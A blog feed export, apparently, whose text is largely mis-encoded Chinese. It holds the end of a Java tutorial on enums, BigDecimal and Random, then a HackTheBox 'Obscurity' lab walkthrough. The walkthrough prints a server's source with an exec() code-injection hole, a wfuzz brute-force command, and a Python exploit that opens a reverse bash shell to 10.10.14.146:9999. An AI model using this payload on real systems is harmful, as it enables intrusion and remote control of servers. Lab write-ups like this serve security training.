<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Weekday day = Weekday.SUN;</span><br><span class="line">        <span class="keyword">switch</span>(day) &#123;</span><br><span class="line">        <span class="keyword">case</span> MON:</span><br><span class="line">        <span class="keyword">case</span> TUE:</span><br><span class="line">        <span class="keyword">case</span> WED:</span><br><span class="line">        <span class="keyword">case</span> THU:</span><br><span class="line">        <span class="keyword">case</span> FRI:</span><br><span class="line">            System.out.println(<span class="string">&quot;Today is &quot;</span> + day + <span class="string">&quot;. Work at office!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SAT:</span><br><span class="line">        <span class="keyword">case</span> SUN:</span><br><span class="line">            System.out.println(<span class="string">&quot;Today is &quot;</span> + day + <span class="string">&quot;. Work at home!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;cannot process &quot;</span> + day);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Weekday</span> </span>&#123;</span><br><span class="line">    MON, TUE, WED, THU, FRI, SAT, SUN;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="BigInteger">BigInteger</h3>
<h3 id="BigDecimal">BigDecimal</h3>
<h4 id="å®šä¹‰-v2">å®šä¹‰</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal bd = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.4567&quot;</span>);</span><br><span class="line">System.out.println(bd.mutiply(bd)); <span class="comment">// 15241.55677489</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="è·å–å°æ•°ä½æ•°">è·å–å°æ•°ä½æ•°</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal d1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.45&quot;</span>);</span><br><span class="line">BigDecimal d2 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.4500&quot;</span>);</span><br><span class="line">BigDecimal d3 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;1234500&quot;</span>);</span><br><span class="line">System.out.println(d1.scale()); <span class="comment">// 2,ä¸¤ä½å°æ•°</span></span><br><span class="line">System.out.println(d2.scale()); <span class="comment">// 4</span></span><br><span class="line">System.out.println(d3.scale()); <span class="comment">// 0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="å‰”é™¤å°æ•°æœ«å°¾0">å‰”é™¤å°æ•°æœ«å°¾0</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal d1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.4500&quot;</span>);</span><br><span class="line">BigDecimal d2 = d1.stripTrailingZeros();</span><br><span class="line">System.out.println(d1.scale()); <span class="comment">// 4</span></span><br><span class="line">System.out.println(d2.scale()); <span class="comment">// 2,å› ä¸ºå»æ‰äº†00</span></span><br><span class="line"></span><br><span class="line">BigDecimal d3 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;1234500&quot;</span>);</span><br><span class="line">BigDecimal d4 = d3.stripTrailingZeros();</span><br><span class="line">System.out.println(d3.scale()); <span class="comment">// 0</span></span><br><span class="line">System.out.println(d4.scale()); <span class="comment">// -2,è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œå¹¶ä¸”æœ«å°¾æœ‰ä¸¤ä¸ª0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="è®¾ç½®ç²¾åº¦">è®¾ç½®ç²¾åº¦</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"><span class="keyword">import</span> java.math.RoundingMode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        BigDecimal d1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.456789&quot;</span>);</span><br><span class="line">        BigDecimal d2 = d1.setScale(<span class="number">4</span>, RoundingMode.HALF_UP); <span class="comment">// 123.4568 å››èˆäº”å…¥ä¿ç•™4ä½å°æ•°</span></span><br><span class="line">        BigDecimal d3 = d1.setScale(<span class="number">4</span>, RoundingMode.DOWN); <span class="comment">//123.4567 ç›´æ¥æˆªæ–­</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="é™¤æ³•è¿ç®—">é™¤æ³•è¿ç®—</h4>
<p>å¯¹<code>BigDecimal</code>åšåŠ ã€å‡ã€ä¹˜æ—¶ï¼Œç²¾åº¦ä¸ä¼šä¸¢å¤±ï¼Œä½†æ˜¯åšé™¤æ³•æ—¶ï¼Œå­˜åœ¨æ— æ³•é™¤å°½çš„æƒ…å†µï¼Œè¿™æ—¶ï¼Œå°±å¿…é¡»æŒ‡å®šç²¾åº¦ä»¥åŠå¦‚ä½•è¿›è¡Œæˆªæ–­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal d1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.456&quot;</span>);</span><br><span class="line">BigDecimal d2 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;23.456789&quot;</span>);</span><br><span class="line">BigDecimal d3 = d1.divide(d2, <span class="number">10</span>, RoundingMode.HALF_UP); <span class="comment">//ä¿ç•™10ä½å°æ•°å¹¶å››èˆäº”å…¥ </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="æ¯”è¾ƒ">æ¯”è¾ƒ</h4>
<p>åœ¨æ¯”è¾ƒä¸¤ä¸ª<code>BigDecimal</code>çš„å€¼æ˜¯å¦ç›¸ç­‰æ—¶ï¼Œè¦ç‰¹åˆ«æ³¨æ„ï¼Œä½¿ç”¨<code>equals()</code>æ–¹æ³•ä¸ä½†è¦æ±‚ä¸¤ä¸ª<code>BigDecimal</code>çš„å€¼ç›¸ç­‰ï¼Œè¿˜è¦æ±‚å®ƒä»¬çš„<code>scale()</code>ç›¸ç­‰ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal d1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.456&quot;</span>);</span><br><span class="line">BigDecimal d2 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.45600&quot;</span>);</span><br><span class="line">d1.equals(d2); <span class="comment">// False</span></span><br><span class="line">d1.equals(d2.stripTrailingZeros()); <span class="comment">// True</span></span><br><span class="line">d1.compareTo(d2); <span class="comment">//0 æ ¹æ®ä¸¤ä¸ªå€¼çš„å¤§å°åˆ†åˆ«è¿”å›è´Ÿæ•°ã€æ­£æ•°å’Œ0ï¼Œåˆ†åˆ«è¡¨ç¤ºå°äºã€å¤§äºå’Œç­‰äºã€‚</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>æ€»æ˜¯ä½¿ç”¨compareTo()æ¯”è¾ƒä¸¤ä¸ªBigDecimalçš„å€¼ï¼Œä¸è¦ä½¿ç”¨equals()ï¼</strong></p>
<h3 id="å¸¸ç”¨å·¥å…·ç±»">å¸¸ç”¨å·¥å…·ç±»</h3>
<ul>
<li>
<p>Mathï¼šæ•°å­¦è®¡ç®—</p>
</li>
<li>
<p>Randomï¼šç”Ÿæˆä¼ªéšæœºæ•°</p>
<p>è¦ç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œå¯ä»¥ä½¿ç”¨<code>nextInt()</code>ã€<code>nextLong()</code>ã€<code>nextFloat()</code>ã€<code>nextDouble()</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Random r = <span class="keyword">new</span> Random();</span><br><span class="line">r.nextInt(); <span class="comment">// 2071575453,æ¯æ¬¡éƒ½ä¸ä¸€æ ·</span></span><br><span class="line">r.nextInt(<span class="number">10</span>); <span class="comment">// 5,ç”Ÿæˆä¸€ä¸ª[0,10)ä¹‹é—´çš„int</span></span><br><span class="line">r.nextLong(); <span class="comment">// 8811649292570369305,æ¯æ¬¡éƒ½ä¸ä¸€æ ·</span></span><br><span class="line">r.nextFloat(); <span class="comment">// 0.54335...ç”Ÿæˆä¸€ä¸ª[0,1)ä¹‹é—´çš„float</span></span><br><span class="line">r.nextDouble(); <span class="comment">// 0.3716...ç”Ÿæˆä¸€ä¸ª[0,1)ä¹‹é—´çš„double</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¦‚æœæˆ‘ä»¬åœ¨åˆ›å»º<code>Random</code>å®ä¾‹æ—¶æŒ‡å®šä¸€ä¸ªç§å­ï¼Œå°±ä¼šå¾—åˆ°å®Œå…¨ç¡®å®šçš„éšæœºæ•°åºåˆ—ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Random r = <span class="keyword">new</span> Random(<span class="number">12345</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            System.out.println(r.nextInt(<span class="number">100</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>SecureRandomï¼šç”Ÿæˆå®‰å…¨çš„éšæœºæ•°</p>
</li>
</ul>
]]></content>
      <categories>
        <category>ç¼–ç¨‹</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Obscurity Walkthrough</title>
    <url>/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Obscurity-Walkthrough">HTB::Obscurity Walkthrough</h1>
<h2 id="0x01-Introduction">0x01 Introduction</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215205639.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>wfuzz</li>
<li>Pythonä»£ç å®¡è®¡</li>
<li>ä»£ç æ‰§è¡Œæ¼æ´</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<p>Nmapæ‰«æç«¯å£å‘ç°å¼€æ”¾äº† <code>8080</code> çš„webç«¯å£</p>
<p>é¡µé¢æç¤ºæœ‰ä¸€ä¸ªæºç æ³„éœ²</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Message to server devs: the current source code for the web server is in &#39;SuperSecureServer.py&#39; in the secret development directory</span><br></pre></td></tr></table></figure>
<p>é‚£æˆ‘ä»¬å°±éœ€è¦çˆ†ç ´ç›®å½•äº†ï¼Œä½¿ç”¨ <code>wfuzz</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wfuzz -c -z file,common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°æœåŠ¡å™¨æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">respTemplate = <span class="string">&quot;&quot;&quot;HTTP/1.1 &#123;statusNum&#125; &#123;statusCode&#125;</span></span><br><span class="line"><span class="string">Date: &#123;dateSent&#125;</span></span><br><span class="line"><span class="string">Server: &#123;server&#125;</span></span><br><span class="line"><span class="string">Last-Modified: &#123;modified&#125;</span></span><br><span class="line"><span class="string">Content-Length: &#123;length&#125;</span></span><br><span class="line"><span class="string">Content-Type: &#123;contentType&#125;</span></span><br><span class="line"><span class="string">Connection: &#123;connectionType&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;body&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">DOC_ROOT = <span class="string">&quot;DocRoot&quot;</span></span><br><span class="line"></span><br><span class="line">CODES = &#123;<span class="string">&quot;200&quot;</span>: <span class="string">&quot;OK&quot;</span>, </span><br><span class="line">        <span class="string">&quot;304&quot;</span>: <span class="string">&quot;NOT MODIFIED&quot;</span>,</span><br><span class="line">        <span class="string">&quot;400&quot;</span>: <span class="string">&quot;BAD REQUEST&quot;</span>, <span class="string">&quot;401&quot;</span>: <span class="string">&quot;UNAUTHORIZED&quot;</span>, <span class="string">&quot;403&quot;</span>: <span class="string">&quot;FORBIDDEN&quot;</span>, <span class="string">&quot;404&quot;</span>: <span class="string">&quot;NOT FOUND&quot;</span>, </span><br><span class="line">        <span class="string">&quot;500&quot;</span>: <span class="string">&quot;INTERNAL SERVER ERROR&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">MIMES = &#123;<span class="string">&quot;txt&quot;</span>: <span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;css&quot;</span>:<span class="string">&quot;text/css&quot;</span>, <span class="string">&quot;html&quot;</span>:<span class="string">&quot;text/html&quot;</span>, <span class="string">&quot;png&quot;</span>: <span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;jpg&quot;</span>:<span class="string">&quot;image/jpg&quot;</span>, </span><br><span class="line">        <span class="string">&quot;ttf&quot;</span>:<span class="string">&quot;application/octet-stream&quot;</span>,<span class="string">&quot;otf&quot;</span>:<span class="string">&quot;application/octet-stream&quot;</span>, <span class="string">&quot;woff&quot;</span>:<span class="string">&quot;font/woff&quot;</span>, <span class="string">&quot;woff2&quot;</span>: <span class="string">&quot;font/woff2&quot;</span>, </span><br><span class="line">        <span class="string">&quot;js&quot;</span>:<span class="string">&quot;application/javascript&quot;</span>,<span class="string">&quot;gz&quot;</span>:<span class="string">&quot;application/zip&quot;</span>, <span class="string">&quot;py&quot;</span>:<span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;map&quot;</span>: <span class="string">&quot;application/octet-stream&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, **kwargs</span>):</span></span><br><span class="line">        self.__dict__.update(kwargs)</span><br><span class="line">        now = datetime.now()</span><br><span class="line">        self.dateSent = self.modified = now.strftime(<span class="string">&quot;%a, %d %b %Y %H:%M:%S&quot;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stringResponse</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> respTemplate.format(**self.__dict__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, request</span>):</span></span><br><span class="line">        self.good = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            request = self.parseRequest(request)</span><br><span class="line">            self.method = request[<span class="string">&quot;method&quot;</span>]</span><br><span class="line">            self.doc = request[<span class="string">&quot;doc&quot;</span>]</span><br><span class="line">            self.vers = request[<span class="string">&quot;vers&quot;</span>]</span><br><span class="line">            self.header = request[<span class="string">&quot;header&quot;</span>]</span><br><span class="line">            self.body = request[<span class="string">&quot;body&quot;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            self.good = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parseRequest</span>(<span class="params">self, request</span>):</span>        </span><br><span class="line">        req = request.strip(<span class="string">&quot;\r&quot;</span>).split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        method,doc,vers = req[<span class="number">0</span>].split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        header = req[<span class="number">1</span>:<span class="number">-3</span>]</span><br><span class="line">        body = req[<span class="number">-1</span>]</span><br><span class="line">        headerDict = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> header:</span><br><span class="line">            pos = param.find(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">            key, val = param[:pos], param[pos+<span class="number">2</span>:]</span><br><span class="line">            headerDict.update(&#123;key: val&#125;)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;method&quot;</span>: method, <span class="string">&quot;doc&quot;</span>: doc, <span class="string">&quot;vers&quot;</span>: vers, <span class="string">&quot;header&quot;</span>: headerDict, <span class="string">&quot;body&quot;</span>: body&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port</span>):</span>    </span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        self.sock.bind((self.host, self.port))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">listen</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sock.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client, address = self.sock.accept()</span><br><span class="line">            client.settimeout(<span class="number">60</span>)</span><br><span class="line">            threading.Thread(target = self.listenToClient,args = (client,address)).start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">listenToClient</span>(<span class="params">self, client, address</span>):</span></span><br><span class="line">        size = <span class="number">1024</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = client.recv(size)</span><br><span class="line">                <span class="keyword">if</span> data:</span><br><span class="line">                    <span class="comment"># Set the response to echo back the recieved data </span></span><br><span class="line">                    req = Request(data.decode())</span><br><span class="line">                    self.handleRequest(req, client, address)</span><br><span class="line">                    client.shutdown()</span><br><span class="line">                    client.close()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> error(<span class="string">&#x27;Client disconnected&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                client.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handleRequest</span>(<span class="params">self, request, conn, address</span>):</span></span><br><span class="line">        <span class="keyword">if</span> request.good:</span><br><span class="line"><span class="comment">#            try:</span></span><br><span class="line">                <span class="comment"># print(str(request.method) + &quot; &quot; + str(request.doc), end=&#x27; &#x27;)</span></span><br><span class="line">                <span class="comment"># print(&quot;from &#123;0&#125;&quot;.format(address[0]))</span></span><br><span class="line"><span class="comment">#            except Exception as e:</span></span><br><span class="line"><span class="comment">#                print(e)</span></span><br><span class="line">            document = self.serveDoc(request.doc, DOC_ROOT)</span><br><span class="line">            statusNum=document[<span class="string">&quot;status&quot;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            document = self.serveDoc(<span class="string">&quot;/errors/400.html&quot;</span>, DOC_ROOT)</span><br><span class="line">            statusNum=<span class="string">&quot;400&quot;</span></span><br><span class="line">        body = document[<span class="string">&quot;body&quot;</span>]</span><br><span class="line">        </span><br><span class="line">        statusCode=CODES[statusNum]</span><br><span class="line">        dateSent = <span class="string">&quot;&quot;</span></span><br><span class="line">        server = <span class="string">&quot;BadHTTPServer&quot;</span></span><br><span class="line">        modified = <span class="string">&quot;&quot;</span></span><br><span class="line">        length = len(body)</span><br><span class="line">        contentType = document[<span class="string">&quot;mime&quot;</span>] <span class="comment"># Try and identify MIME type from string</span></span><br><span class="line">        connectionType = <span class="string">&quot;Closed&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        resp = Response(</span><br><span class="line">        statusNum=statusNum, statusCode=statusCode, </span><br><span class="line">        dateSent = dateSent, server = server, </span><br><span class="line">        modified = modified, length = length, </span><br><span class="line">        contentType = contentType, connectionType = connectionType, </span><br><span class="line">        body = body</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        data = resp.stringResponse()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        conn.send(data.encode())</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serveDoc</span>(<span class="params">self, path, docRoot</span>):</span></span><br><span class="line">        path = urllib.parse.unquote(path)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = <span class="string">&quot;output = &#x27;Document: &#123;&#125;&#x27;&quot;</span> <span class="comment"># Keep the output for later debug</span></span><br><span class="line">            exec(info.format(path)) <span class="comment"># This is how you do string formatting, right?</span></span><br><span class="line">            cwd = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">            docRoot = os.path.join(cwd, docRoot)</span><br><span class="line">            <span class="keyword">if</span> path == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">                path = <span class="string">&quot;/index.html&quot;</span></span><br><span class="line">            requested = os.path.join(docRoot, path[<span class="number">1</span>:])</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(requested):</span><br><span class="line">                mime = mimetypes.guess_type(requested)</span><br><span class="line">                mime = (mime <span class="keyword">if</span> mime[<span class="number">0</span>] != <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&quot;text/html&quot;</span>)</span><br><span class="line">                mime = MIMES[requested.split(<span class="string">&quot;.&quot;</span>)[<span class="number">-1</span>]]</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">with</span> open(requested, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        data = f.read()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">with</span> open(requested, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        data = f.read()</span><br><span class="line">                status = <span class="string">&quot;200&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                errorPage = os.path.join(docRoot, <span class="string">&quot;errors&quot;</span>, <span class="string">&quot;404.html&quot;</span>)</span><br><span class="line">                mime = <span class="string">&quot;text/html&quot;</span></span><br><span class="line">                <span class="keyword">with</span> open(errorPage, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    data = f.read().format(path)</span><br><span class="line">                status = <span class="string">&quot;404&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            errorPage = os.path.join(docRoot, <span class="string">&quot;errors&quot;</span>, <span class="string">&quot;500.html&quot;</span>)</span><br><span class="line">            mime = <span class="string">&quot;text/html&quot;</span></span><br><span class="line">            <span class="keyword">with</span> open(errorPage, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                data = f.read()</span><br><span class="line">            status = <span class="string">&quot;500&quot;</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;body&quot;</span>: data, <span class="string">&quot;mime&quot;</span>: mime, <span class="string">&quot;status&quot;</span>: status&#125;</span><br></pre></td></tr></table></figure>
<p>å®¡è®¡æºç ï¼Œå¤§è‡´è¯´ä¸€ä¸‹ä»£ç çš„å«ä¹‰ï¼Œå¼€å¯socketç›‘å¬ï¼Œæ¥æ”¶åˆ°httpè¯·æ±‚ï¼Œè°ƒç”¨ <code>Request</code> ç±»çš„ <code>parseRequest</code> æ–¹æ³•åšåˆ†å‰²ï¼Œç„¶åè°ƒç”¨ <code>handleRequest</code> å¤„ç†è¯·æ±‚ï¼Œé€šè¿‡ <code>serveDoc</code> å¤„ç†è¯·æ±‚çš„æ–‡æ¡£ã€‚</p>
<p>æŸ¥æ‰¾æ•æ„Ÿå‡½æ•°å‘ç°å…³é”®ç‚¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serveDoc</span>(<span class="params">self, path, docRoot</span>):</span></span><br><span class="line">    path = urllib.parse.unquote(path)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        info = <span class="string">&quot;output = &#x27;Document: &#123;&#125;&#x27;&quot;</span> <span class="comment"># Keep the output for later debug</span></span><br><span class="line">        exec(info.format(path)) <span class="comment"># This is how you do string formatting, right?</span></span><br><span class="line">        cwd = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        docRoot = os.path.join(cwd, docRoot)</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„pathæ˜¯æ±¡ç‚¹å‚æ•°ï¼Œexecå‡½æ•°å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path = <span class="string">&quot;\&#x27;;os.system(&#x27;whoami&#x27;)#&quot;</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åé€šè¿‡pythonåå¼¹shellï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://10.10.10.168:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;5\&#x27;&#x27;</span>+<span class="string">&#x27;\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.146&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])\na=\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = urllib.parse.quote(path)</span><br><span class="line">print(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">print(url+payload)</span><br><span class="line"></span><br><span class="line">r= requests.get(url+payload)</span><br><span class="line">print(r.headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Python åå¼¹shellè®²è§£ï¼š<a href="https://www.leavesongs.com/PYTHON/python-shell-backdoor.html">https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</a></p>
</blockquote>
<p>è¿›å…¥robertç›®å½•ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200306170536.png" alt=""></p>
<p>æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶</p>
<p>check.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Encrypting this file with your key should result in out.txt, make sure your key is correct!</span><br></pre></td></tr></table></figure>
<p>chect.txtåŠ å¯†åçš„ç»“æœæ˜¯out.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@obscure:&#x2F;home&#x2F;robert$ xxd out.txt</span><br><span class="line">xxd out.txt</span><br><span class="line">00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................</span><br><span class="line">00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................</span><br><span class="line">00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................</span><br><span class="line">00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................</span><br><span class="line">00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................</span><br><span class="line">00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................</span><br><span class="line">00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................</span><br><span class="line">00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................</span><br><span class="line">00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................</span><br><span class="line">00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................</span><br><span class="line">000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................</span><br><span class="line">000000b0: c38c c397 c289 c281 76                   ........v</span><br></pre></td></tr></table></figure>
<p>passwordreminder.txt</p>
